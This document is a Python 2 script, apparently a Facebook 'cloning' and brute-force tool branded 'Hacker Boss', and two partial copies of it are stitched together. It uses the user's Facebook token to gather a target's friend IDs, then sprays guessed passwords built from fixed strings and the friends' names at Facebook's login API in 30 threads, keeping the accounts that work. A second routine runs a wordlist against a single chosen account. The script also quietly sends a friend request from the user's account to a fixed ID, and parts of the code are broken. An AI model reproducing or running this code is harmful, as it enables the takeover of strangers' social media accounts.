	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        os.system('xdg-open https://youtu.be/gO3sM5ZvTw4')
	        login()
	elif peak =="3":
	        tokenz()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()
		
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan('  \033[1;91mNote Do Not Use Your Personal Account' )
		jalan(' \033[1;92mCreate New Account For Login Safely' )
		print "\033[1;93mNew Commands Use It For Cloning"
		print('	' )
		id = raw_input('\x1b[1;94mFacebook Email/Pass : \x1b[1;94m')
		pwd = raw_input('\x1b[1;94mPassword  \x1b[1;94m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successfully'
				os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;91mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Hacker
        time.sleep(0.05)
	print logo2
	print "\033[1;93mLogged in User Info"
        time.sleep(0.05)
	print "	  \033[1;93m Name\033[1;93m:\033[1;96m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   ID\033[1;91m:\033[1;93m"+id+"\x1b[1;93m              "
        time.sleep(0.05)
        print "033[1;97m==========================\033[1;97m"
        time.sleep(0.05)
	print "1 .\x1b[1;94m\033[1;94mStart Cloning   "
        time.sleep(0.05)
        print "2 .\x1b[1;94m\033[1;94mStart Target Hacking        "
        time.sleep(0.05)
	print "0 .\033[1;94m\033[1;94mLogout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97mChoose Option ---> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo19
	print "1 .\x1b[1;93mStart Cloning    "
        time.sleep(0.05)
	print "0. \033[1;93mBack"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;96mChoose an Option ---> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;92mEnter ID : \033[1;92m")
		print "►▸▹►▸▹►▸▹►►▸▹►▸▹►▸▹►▸▹◃◄◅◃◄◅◃◄◅▸▹◃◄◅◃◄◅◃◄◅"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;94mName\033[1;94m:\033[1;94m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			crack()
		print"\033[1;97mGetting IDs\033[1;97m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
	elif peak =="0":
		men()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;97m"+str(len(id))
	jalan('\033[1;97mPlease Wait\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mCloning\033[1;94m"+o),;sys.stdout.flush();time.sleep(1)
	print "\033[1;96mTo Stop Process Press CTRL then Z"
	print "\033[1;91m-------------------------------------------------------------------"
	jalan(' \033[1;95mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m     😈 Started Cloning Wait A while 😈 ')
	print "\033[1;91m----------------------------------------"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:Hacker
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('007007')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['last_name'] + '000786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['first_name'] + '786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['last_name'] + '12345'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤"
	print "  Written By Boss Tech" #Dev:Hacker
	print '\033[1;94mProcess Has Been Completed \033[1;94m....'
        print '\033[1;92mType (python2 Dvl.py) New Fb Start Cloning\033[1;92m....'
	print"\033[1;96mTotal Live/\x1b[1;96mCheckpoint \033[1;96m: \033[1;96m"+str(len(OK))+"\033[1;96m/\033[1;96m"+str(len(CP))
	print """


\033[1;96m░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░
\033[1;96m░░░░█░░░░░░░░░░░░░█░░░░
\033[1;96m░░░█░░░░░░░░░░▄▄▄░░█░░░
\033[1;96m░░░█░░▄▄▄░░▄░░███░░█░░░
\033[1;96m░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░
\033[1;96m░░░█░░▀█  █  █  █  █▀░░█░░░
\033[1;96m░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░
\033[1;96m░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░


\033[1;92m CHECKPOINT ID AFTER 1 WEEKS (7DAYS)

"""
	
	raw_input("\n\033[1;92m[\033[1;92mBack\033[1;92m]")
	crack()
	
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo14
        print '-----------------------------------------------------------'
        try:
            email = raw_input('\x1b[1;96mID\x1b[1;95m/\x1b[1;95mEmail \x1b[1;95mTarget \x1b[1;95m:\x1b[1;95m ')
            passw = raw_input('\x1b[1;95mWordlist \x1b[1;95m(Type--> dvl.list) \x1b[1;95m: \x1b[1;95m')
            total = open(passw, 'r')
            total = total.readlines()
            print '------------------------------------------------------------'
            print '\x1b[1;94m[\x1b[1;94m\xe2\x9c\x93\x1b[1;97m] \x1b[1;94mTarget \x1b[1;94m:\x1b[1;94m ' + email
            time.sleep(0.05)
            print '\x1b[1;94mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;94mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;94m[\xe2\x9c\xba] \x1b[1;94mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;97m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;97m] \x1b[1;97mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' ● ' + pw + '\n')
                        dapat.close()
                        print '\x1b[1;95mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\x1b[1;92mFounded.'
                            print  "--------------------------------------------------"
                            print '\x1b[1;91m[!] \x1b[1;97mAccount Maybe Checkpoint'
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect """
            super()
            
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;93mToken\033[1;91m : Enter Acces Token Here :- ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;97m[?] \033[1;97mToken Invalid Refresh Page\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print 'Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print 'successfully generate access token'
		print 'Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print 'Failed to generate access token'
		print 'Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print 'Failed to generate access token'
		print 'Connection error !!!'
		os.remove('cookie/token.log')
		menu()
		
          
if __name__ == '__main__':
	login()
	
	
	#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;97mToken\033[1;91m : \033[1;95mCopy👉 \033[1;92mEAAAAUaZA8jlABAEZBmW0yH8w0R2XhpqqNiaQvKDkm1wCFazEcrJEzJThJrjZC3fuBFP6DFNmNnZB8ueUyVZCH7zPMulcTHZBa9ZCRHTTRTc0wneLqx5BZBruQbJQAx5pssqNnZB9qH6oHFjqWJf0yoOFkawm7hDqVYM8wCALx4xv7hi4ERoBPpgSGKAsm95Xt8fcZD \033[1;96m👈 Without fb ID free login Copy Paste & Enter👉\033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		Name = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
#### LOGO ####
logo = """
\033[1;91m┏┓︱︱ ︱︱︱︱ ︱︱︱︱ ┏┓︱︱ ︱︱\033[1;91m︱︱ ︱︱︱   ┏┓︱︱ ︱︱︱︱ ︱︱︱︱ ︱︱︱︱
\033[1;92m┃┃︱︱ ︱︱︱︱ ︱︱︱︱ ┃┃︱︱ ︱︱\033[1;92m︱︱ ︱︱︱   ┃┃︱︱ ︱︱︱︱ ︱︱︱︱ ︱︱︱︱
\033[1;93m┃┗━┓ ┏━━┓ ┏━━┓ ┃┃┏┓ ┏━━┓ ┏━┓  \033[1;93m ┃┗━┓ ┏━━┓ ┏━━┓ ┏━━┓
\033[1;94m┃┏┓┃ ┃┏┓┃ ┃┏━┛ ┃┗┛┛ ┃┃━┫ ┃┏┛   \033[1;94m┃┏┓┃ ┃┏┓┃ ┃━━┫ ┃━━┫
\033[1;95m┃┃┃┃ ┃┏┓┃ ┃┗━┓ ┃┏┓┓ ┃┃━┫ ┃┃︱  \033[1;95m ┃┗┛┃ ┃┗┛┃ ┣━━┃ ┣━━┃
\033[1;96m┗┛┗┛ ┗┛┗┛ ┗━━┛ ┗┛┗┛ ┗━━┛ ┗┛︱  \033[1;96m ┗━━┛ ┗━━┛ ┗━━┛ ┗━━┛
\033[1;31m\033[1;31m╔══════════════════════════════════════════════════╗
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* AUTHOR  : \033[1;39mH4cK3R Hacker Boss                    \033[1;31m║
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* Telegram: \033[1;39mhttps://T.me/Hackerboss001      \033[1;31m║
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* youtube : \033[1;39mhttps://Boss MaFiA\033[1;31m║
\033[1;31m\033[1;31m╚══════════════════════════════════════════════════╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mLoging In \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker☆boss\033[1;96m•◈•───────────────•◈•"
print  """
\033[1;91m┏┓︱︱ ︱︱︱︱ ︱︱︱︱ ┏┓︱︱ ︱︱\033[1;91m︱︱ ︱︱︱   ┏┓︱︱ ︱︱︱︱ ︱︱︱︱ ︱︱︱︱
\033[1;92m┃┃︱︱ ︱︱︱︱ ︱︱︱︱ ┃┃︱︱ ︱︱\033[1;92m︱︱ ︱︱︱   ┃┃︱︱ ︱︱︱︱ ︱︱︱︱ ︱︱︱︱
\033[1;93m┃┗━┓ ┏━━┓ ┏━━┓ ┃┃┏┓ ┏━━┓ ┏━┓  \033[1;93m ┃┗━┓ ┏━━┓ ┏━━┓ ┏━━┓
\033[1;94m┃┏┓┃ ┃┏┓┃ ┃┏━┛ ┃┗┛┛ ┃┃━┫ ┃┏┛   \033[1;94m┃┏┓┃ ┃┏┓┃ ┃━━┫ ┃━━┫
\033[1;95m┃┃┃┃ ┃┏┓┃ ┃┗━┓ ┃┏┓┓ ┃┃━┫ ┃┃︱  \033[1;95m ┃┗┛┃ ┃┗┛┃ ┣━━┃ ┣━━┃
\033[1;96m┗┛┗┛ ┗┛┗┛ ┗━━┛ ┗┛┗┛ ┗━━┛ ┗┛︱  \033[1;96m ┗━━┛ ┗━━┛ ┗━━┛ ┗━━┛
"""
print "\033[1;96m•◈•───────────────•◈•\033[1;92mHACKER♡BOSS\033[1;96m•◈•───────────────•◈•"
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ┃╯╯╭━┫▏╰╰╰▕      ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇     ┃╯╯┃▔╰┓▔▂▔▕╮     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰╮╯┃┈╰┫╰━╯┏╯     ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇     ┏╯╯┃╭━╯┳━┳╯      ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰━┳╯▔╲╱▔╭╮▔╲     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇   ┃┈╲┈╲╱╭╯╮▕     ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇       ┃┈▕╲▂╱┈╭╯╱     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃'''┈┃┈┃┈'''   ▇▇▇▇▇▇┻┳┻┳┻┳")
jalan("    \033[1;93m┻┳┻┳▇▇▇▇▇▇     ┏╯▔'''╰┓┣━┳┫     ▇▇▇▇▇▇┳┻┳┻┳┻")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("    \033[1;93m▇▇\033[1;95m           WellCome to Hacker Boss     \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;91m              👇  AUTHOR  👇          \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m          This Tools Is Created By    \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m                Hacker Boss         \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m       YOUTUBE   Boss MaFiA   \033[1;93m▇▇")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")

CorrectUsername = "Hacker"
CorrectPassword = "Boss"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \033[1;91mUSERNAME \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \033[1;91mPASSWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Hacker boss
            loop = 'false'
        else:
            print "Serious Please"
            os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
    else:
        print "Wrong Dear!"
        os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')

####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m1.\x1b[1;96m Login With Facebook  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m2.\x1b[1;95m Login With Token"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m3.\x1b[1;93m Get Access Token App Fb"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;96mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan("\033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account")
		jalan("\033[1;91mWarning  \033[1;92mUse a New Account To Login")
		print('\033[1;97m\x1b[1;96m................LOGIN WITH FACEBOOK................\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;93mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;93mPassword      \x1b[1;93m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
